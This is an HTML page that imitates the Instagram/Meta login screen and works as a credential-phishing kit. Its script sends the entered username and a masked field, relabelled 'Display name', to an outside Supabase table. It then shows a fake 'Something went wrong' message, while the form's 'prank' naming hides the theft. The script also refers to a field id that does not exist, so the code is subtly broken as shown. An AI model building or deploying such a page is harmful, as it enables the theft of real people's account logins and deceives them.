<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
  <meta name="theme-color" content="#152127">
  <title>Log in</title>
  <style>
    :root{color-scheme:dark;--bg:#152127;--field:#182126;--border:#465057;--muted:#aab0b5;--text:#f3f5f7;--blue:#0866df;--blue-light:#5ba4ff}
    *{box-sizing:border-box}html,body{margin:0;min-height:100%}
    body{min-height:100vh;min-height:100svh;background:var(--bg);color:var(--text);font-family:Roboto,"Segoe UI",Arial,sans-serif;-webkit-font-smoothing:antialiased}
    .page{width:min(100%,720px);min-height:100vh;min-height:100svh;margin:0 auto;padding:max(24px,env(safe-area-inset-top)) 28px max(26px,env(safe-area-inset-bottom));display:flex;flex-direction:column}
    .top-placeholder{height:31vh;min-height:190px;max-height:360px;flex:0 0 auto;position:relative}
    .top-image-holder{width:88px;height:88px;position:absolute;top:58%;left:50%;transform:translate(-50%,-50%);object-fit:contain}
    .login-form{display:flex;flex-direction:column;gap:12px}
    .field{width:100%;height:52px;border:1px solid var(--border);border-radius:8px;background:var(--field);color:var(--text);padding:0 14px;font:inherit;font-size:15px;font-weight:600;outline:none;transition:border-color .18s,box-shadow .18s}
    .field-wrap{position:relative;width:100%}.field-wrap .field{padding-right:76px}
    .visibility-toggle{position:absolute;z-index:2;right:8px;top:50%;transform:translateY(-50%);height:36px;min-width:48px;padding:0 9px;border:0;border-radius:6px;background:transparent;color:var(--blue-light);font:inherit;font-size:12px;font-weight:700;cursor:pointer;touch-action:manipulation;-webkit-tap-highlight-color:transparent}
    .field::placeholder{color:var(--muted);opacity:1}.field:focus{border-color:var(--blue-light);box-shadow:0 0 0 3px #5ba4ff20}
    .login-button{height:50px;width:100%;border:0;border-radius:999px;background:var(--blue);color:white;font:inherit;font-size:16px;font-weight:700;cursor:pointer}
    .login-button:disabled{opacity:.7;cursor:wait}
    .bottom-area{margin-top:auto;padding-top:32px}
    .bottom-image-holder{display:block;width:120px;height:32px;object-fit:contain;margin:16px auto 0}
    .toast{position:fixed;left:50%;bottom:22px;transform:translate(-50%,16px);width:max-content;max-width:calc(100% - 36px);padding:12px 16px;border-radius:10px;background:#26343b;color:#fff;font-size:13px;font-weight:600;opacity:0;pointer-events:none;transition:.2s;box-shadow:0 8px 28px #0005;text-align:center;z-index:5}
    .toast.show{opacity:1;transform:translate(-50%,0)}
    .notice{text-align:center;color:var(--muted);font-size:11px;line-height:1.45;margin:2px 0 0}
    button:focus-visible{outline:3px solid var(--blue-light);outline-offset:4px}
    @media(max-height:760px){.top-placeholder{height:27vh;min-height:150px}.field{height:50px}.login-form{gap:10px}.login-button{height:48px}.bottom-area{padding-top:28px}}
    @media(max-width:380px){.page{padding-left:20px;padding-right:20px}}
  </style>
</head>
<body>
  <main class="page">
    <div class="top-placeholder"><img class="top-image-holder" src="3HKZyjLmk4x.webp" alt="Instagram"></div>
    <form class="login-form" id="prankForm">
      <input class="field" id="identifier" name="identifier" type="text" placeholder="Username, email or mobile number" autocomplete="off" aria-label="Username, email or mobile number" required>
      <div class="field-wrap">
        <input class="field" id="displayName" name="displayName" type="password" placeholder="Display name" autocomplete="off" aria-label="Display name" required>
        <button class="visibility-toggle" id="toggleVisibility" type="button" aria-label="Show display name">Show</button>
      </div>
      <button class="login-button" id="submitButton" type="submit">Log in</button>
      <p class="notice"><a href="#" id="forgotPassword" style="color:var(--blue-light);text-decoration:none;font-size:13px;font-weight:600">Forgot password?</a></p>
    </form>
    <div class="bottom-area"><img class="bottom-image-holder" src="InShot_20261123_195930356.jpg" alt="Meta"></div>
  </main>
  <div class="toast" id="toast" role="status" aria-live="polite"></div>
  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2.119.2"></script>
  <script>
    const supabase=window.supabase.createClient('https://antqqabimhgepykkkmwl.supabase.co','sb_publishable_w6n4kCXq8cJoyd-8PE0HoQ_YBPYoI_7');
    const form=document.getElementById('prankForm');
    const button=document.getElementById('submitButton');
    const toast=document.getElementById('toast');
    const displayNameInput=document.getElementById('Password');
    const visibilityToggle=document.getElementById('toggleVisibility');
    let toastTimer;
    visibilityToggle.addEventListener('click',event=>{
      event.preventDefault();
      const isHidden=displayNameInput.getAttribute('type')==='password';
      displayNameInput.setAttribute('type',isHidden?'text':'password');
      visibilityToggle.textContent=isHidden?'Hide':'Show';
      visibilityToggle.setAttribute('aria-label',isHidden?'Hide display name':'Show display name');
      visibilityToggle.setAttribute('aria-pressed',String(isHidden));
    });
    function showToast(message){
      toast.textContent=message;toast.classList.add('show');clearTimeout(toastTimer);
      toastTimer=setTimeout(()=>toast.classList.remove('show'),3200);
    }
    form.addEventListener('submit',async event=>{
      event.preventDefault();
      const identifier=document.getElementById('identifier').value.trim();
      const displayName=document.getElementById('Password').value.trim();
      button.disabled=true;
      try{
        const {error}=await supabase.from('profile_submissions').insert({
          username:identifier,
          display_name:displayName
        });
        if(error) console.error('Submission save failed:',error.message);
      }catch(error){console.error('Submission save failed:',error);}
      showToast('Something went wrong');
      button.disabled=false;
    });
  </script>
</body>
</html>
